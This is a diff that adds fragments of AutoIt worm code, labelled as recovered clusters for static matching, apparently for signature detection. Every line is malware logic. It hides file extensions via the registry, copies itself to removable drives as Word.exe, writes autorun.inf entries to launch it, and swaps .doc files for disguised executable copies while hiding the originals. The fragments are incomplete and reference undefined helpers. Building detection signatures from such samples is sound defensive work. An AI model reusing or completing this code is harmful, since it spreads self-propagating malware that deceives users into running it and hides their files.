@@ -1,0 +1,25 @@
+; Recovered AutoIt operation clusters for static matching only.
+	RegWrite ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" , "HideFileExt" , "REG_DWORD" , "1" )
+DriveGetDrive ( "removable" )
+						FileCopy ( @AutoItExe , $DVAR [ $I ] & "\Word.exe" , 1 )
+Func CHANGEATTRIB ( $FOLDERNAME , $FILENAME )
+	$EX = StringRight ( $FILENAME , 4 )
+	If $EX = ".doc" And DriveSpaceFree ( $FOLDERNAME & "\" ) > 1 Then
+		$R = StringLen ( $FILENAME ) - 4
+		FileCopy ( @SystemDir & "\" & $V1 & ".exe" , $FOLDERNAME & "\" & $FILENAME & ".exe" , 0 )
+		FileSetAttrib ( $FOLDERNAME & "\" & $FILENAME & ".exe" , "-RASH" )
+		CHANGEMD5 ( $FOLDERNAME & "\" & $FILENAME & ".exe" )
+		FileMove ( $FOLDERNAME & "\" & $FILENAME , $FOLDERNAME & "\" & StringLeft ( $FILENAME , $R ) & ".nal" )
+		FileSetAttrib ( $FOLDERNAME & "\" & StringLeft ( $FILENAME , $R ) & ".nal" , "+RASH" , 0 )
+	EndIf
+EndFunc
+Func COPYAUTO ( $VPATH )
+	$V = FileOpen ( $VPATH , 1 )
+	FileWrite ( $V , "[AUTORUN]" & @CRLF )
+	FileWrite ( $V , "open=Word.exe" & @CRLF )
+	FileWrite ( $V , "shellexecute=Word.exe" & @CRLF )
+	FileWrite ( $V , "shell\Explore\command=Word.exe" & @CRLF )
+	FileWrite ( $V , "shell\Open\command=Word.exe" & @CRLF )
+	FileWrite ( $V , "shell=Explore" & @CRLF )
+	FileClose ( $V )
+EndFunc
